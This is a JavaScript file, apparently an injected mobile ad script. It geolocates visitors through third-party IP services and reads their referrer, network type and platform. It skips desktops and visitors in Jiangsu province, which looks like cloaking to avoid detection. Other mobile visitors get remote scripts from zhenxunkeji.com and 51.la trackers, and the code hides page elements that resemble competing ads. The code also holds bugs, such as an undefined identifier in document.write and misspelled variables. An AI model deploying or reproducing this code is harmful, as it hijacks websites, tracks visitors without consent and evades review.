/* 2019.12.16代码1543 20200713.1936 www.zhenxunkeji.com */
/* 126接口 */
var _c_top_001=["<script type='text/javascript' src='https://ip.ws.126.net/ipquery'></script>"];
/* 火猫接口 */
var _c_top_002=["<script type='text/javascript' src='https://ip.huomao.com/ip?format=js'></script>"];
/* 搜索引擎代码 */
var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|sm|so)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
var _c_top_003=["<script type='text/javascript'>if(regexp.test(where)){document.write(_c_top_004);}else{document.write(_c_top_004);}</script>"];
/* JS判断地区省市代码1 */
var tc=1;
var _c_top_004=["<script type='text/javascript'>if(localAddress.province.indexOf('江苏') != -1 || localAddress.province.indexOf('江苏省') != -1 || localAddress.province.indexOf('未知地区001') != -1 || localAddress.province.indexOf('未知地区002') != -1) {bsgs=1;document.write(_c_top_017);}else{bsgs=0;document.write(_c_top_005);}</script>"];
/* 指定联网类型代码 */
var connection = navigator.connection||navigator.mozConnection||navigator.webkitConnection||{tyep:'unknown'};
var type_text = ['unknown','ethernet','wifi','2g','3g','4g','5g','none'];
mtype = connection.type;
var _c_top_005=["<script type='text/javascript'>if(/wifi|wi-fi|wlan|w-lan/i.test(mtype)){document.write(_c_top_011+_c_top_006+_c_top_016);}else if(/cellular|5g|4g|3g|2g/i.test(mtype)){document.write(_c_top_007);}else{document.write(_c_top_007);}</script>"];
/* JS隐藏AD代码006 */
var _c_top_006=["<script type='text/javascript'>(function(){var myArray=new Array('div','img00','span00','p00','a00','li00');for(var i=0;i<6;i++){var ifr=document.getElementsByTagName(myArray[i]);if(ifr&&ifr.length>0){for(var j=0;j<ifr.length;j++){var obj=ifr[j];var ids=obj.getAttribute('id');var cls=obj.getAttribute('class');if(cls){if(obj.tagName=='A'&&cls.indexOf(' ')!=-1&&obj.getAttribute('onclick')&&obj.getAttribute('target')&&obj.href){obj.style.display='none'}}if(ids&&cls){if(ids==cls&&cls.length>10&&obj.tagName=='LI')obj.style.display='none'}if(ids){if(ids.length>30&&ids.indexOf('-')==-1){obj.style.display='none'}if((/^[0-9]*$/.test(ids))&&ids.length>1){obj.style.display='none'}if(ids.length>7&&/[0-9]/.test(ids)&&/[a-z]/i.test(ids)&&obj.getAttribute('style')){obj.style.display='none'}}if(ids&&cls){if(cls.indexOf(' ')!=-1&&cls.indexOf(ids)!=-1&&obj.getAttribute('style')){obj.style.display='none'}if(ids==cls){if(/[0-9]/.test(ids)&&/[a-z]/i.test(ids)){obj.style.display='none'}}}}}}})();</script>"];
/* JS判断地区省市代码2 */
var tc=1;
var _c_top_007=["<script type='text/javascript'>if(remote_ip_info.province.indexOf('江苏') != -1 || remote_ip_info.province.indexOf('江苏省') != -1 || remote_ip_info.province.indexOf('未知地区003') != -1 || remote_ip_info.province.indexOf('未知地区004') != -1) {bsgs=1;document.write(_c_top_017);}else{bsgs=0;document.write(_c_top_011+_c_top_006+_c_top_016);}</script>"];
/* 总统计1 */
var _c_top_015=["<script type='text/javascript' src='https://js.users.51.la/20145157.js'></script>"];
/* 实际统计1 */
var _c_top_016=["<script type='text/javascript' src='https://js.users.51.la/20010531.js'></script>"];
/* 未用统计1 */
var _c_top_017=["<script type='text/javascript' src='https://js.users.51.la/20385827.js'></script>"];
/* 广告代码021-022改011 */
var _c_top_011=["<body><script id='mob' type='text/javascript' charset='utf-8' src='https://www.zhenxunkeji.com/d.php?pid=3246'></script> <script id='mob' type='text/javascript' charset='utf-8' src='https://www.zhenxunkeji.com/x.php?pid=3246'></script></body>"];

/* JS判断电脑移动端代码 */
//平台、设备和操作系统
 var system ={
 win : false,
 mac : false,
 xll : false
 };
 //检测平台
 var p = navigator.platform;
 system.win = p.indexOf("Win") == 0;
 system.mac = p.indexOf("Mac") == 0;
 system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
 //跳转语句
 if(system.win||system.mac||system.xll){
 document.write(无);
 }else{
 document.write(_c_top_001+_c_top_002+_c_top_003+_c_top_015);
 }
